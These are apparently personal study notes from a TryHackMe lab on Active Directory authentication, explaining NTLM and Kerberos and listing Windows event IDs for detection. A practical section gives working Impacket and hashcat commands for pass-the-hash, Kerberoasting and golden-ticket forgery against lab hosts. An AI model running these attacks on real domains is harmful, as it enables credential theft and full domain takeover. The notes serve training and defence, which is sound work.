
#### This was a great room and it's free, so make sure to check it out or tag along!
### [room link](https://tryhackme.com/room/introtoactivedirectoryauthentication)

### Authentication

Username and passowrd
 - most common

Certificates
 - issued by a trusted Certificate Authority (CA)

 - machine auth or smart card logins

Hashes
 - not it's intended purpose but can be used for auth aswell

### Authentication Protocols

NetNTLM (NTLM)
 - challenge-response protocol
 - old, but widely used
 - NTLMv1 is very bad
 - NTLMv2 is just bad
 - zero-knowledge proof (password is never directly revealed)

Kerberos
 - newer & more secure than NTLM
 - uses tickets for authentication

# NTLM

### NTLM benefits:
 - simple
 - no need for a KDC (Key Distribution Center)

 - no time synchronization needed
 - workgroup environments (non-domain) where Kerberos is not available

### NTLM drawbacks:
 - no mutual authentication (server is trusted in the trust-me-bro way)
 - weak cryptography
    - NTLMv1: uses DES and unsalted hashes
    - NTLMv2: stores unsalted hashes in memory
 - vulnerable to relay attacks
 - vulnerable to pass-the-hash attacks (knowing the hash is enough to authenticate)
 - slower performance due to communication overhead

# Kerberos
 - default authentication protocol for Active Directory
 - ticket-based system, trusted 3rd party

### The difference
main difference is where authentication is performed:

NTLM
 - you authenticate to the service 
 - this service verifies your identity with the domain controller

Kerberos
 - you authenticate to the domain controller
 - it gives you tickets that you give the services to prove yourself

### Kerberos components

Key Distribution Center (KDC)
  - handles all ticket requests
  - authentication service (AS)
  - ticket granting service (TGS)

Authentication Service (AS)
  - verifies the identity of the user
  - issues a Ticket Granting Ticket (TGT)

Ticket Granting Service (TGS)
 - issues service tickets to users with valid TGTs

Ticket Granting Ticket (TGT)
 - issued after successful authentication
 - used to request access to services

Service Ticket (ST)
 - grants access to a specific service
 - get it from TGS by presenting a valid TGT

Service Principal Name (SPN)
 - unique identifier for a service instance

KRBTGT 
 - special AD account whose password hash encrypts all TGTs
 - compromise allows forging Golden Tickets

### Benefits of Kerberos
 - mutual authentication
 - no passwords or hashes sent over the network
 - single sign-on (SSO) capabilities
 - better performance
 - less communication overhead (services validate tickets locally)
 - delegation support (services can act on behalf of users)
 - time-limited tickets (typically 10 hours for TGTs)

### Drawbacks of Kerberos
 - requires time synchronization (within 5 minutes)
 - requires a KDC (domain controller)
 - KDC is a single point of failure
 - vulnerable to TGT theft (Pass-the-Ticket)
 - Golden Ticket attacks if KRBTGT is compromised
 - kerberoasting - any authenticated user can request service tickets and attempt to crack them offline (they are encrypted with service account hashes)

Note: when using Kerberos, we use hostnames, because it relies on SPNs which are tied to DNS names




# Practical task notes

Impacket supports Pass-the-Hash authentication directly with -hashes

`smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10`

### Kerberoasting

identify service accounts that have registered SPNs

`GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request`

that gave us a service ticket hash aswell

we will save it to service_ticket.txt and use hashcat
-m 13100 is Kerberos TGS-REP tickets

`hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt`

`smbclient.py "thm.loc/svc_printer:<CRACKED_PASSWORD>"@192.168.11.51`

now we do attacker stuff as the svc_printer service account

### Golden ticket

```
forging Kerberos TGTs by using the password hash of the KRBTGT account
```

we will use Impacket's ticketer.py to forge a golden ticket for the domain Administrator

`ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator`

this also saved the forged TGT to Administrator.ccache

nwow set the environment variable to use it

`export KRB5CCNAME=Administrator.ccache`

auth as the Domain Administrator using the forged TGT

`smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100`

remember to use hostnames

# Detection & mitigation

windows logs a security event for each authentication attempt

### Common Event IDs + detection usecases

4624 - successful logon (important for NTLM attacks)

4625 - failed logon (password spraying, bruteforce)

4768 - Kerberos TGT request

4769 - Kerberos service ticket request (important for kerberoasting)

4771 - Kerberos pre-authentication failed (kerberoasting, bruteforce)

### Detecting NTLM-Based Attacks

`Event ID 4624` (succesful logon) with these fields:

Authentication Package
 - value `NTLM` while Kerberos logons show value `Kerberos` in the same field

Logon Type
 - value `3` (network logon)

Source Network Address
 - blank value

### Detecting Kerberoasting

`Event ID 4769` (Kerberos service ticket request)

look for:
1) very high volume of 4769 events in a short time frame & same account

2) Ticket Encryption Type
 - value `0x17` (RC4-HMAC) while modern environments use AES-256 (0x12) by default
 - RC4 is weaker and easier + faster to crack than AES (attacker loves it)

---

Huge shoutout to the room creator/s, it was the bomb! First time I had fun with AD.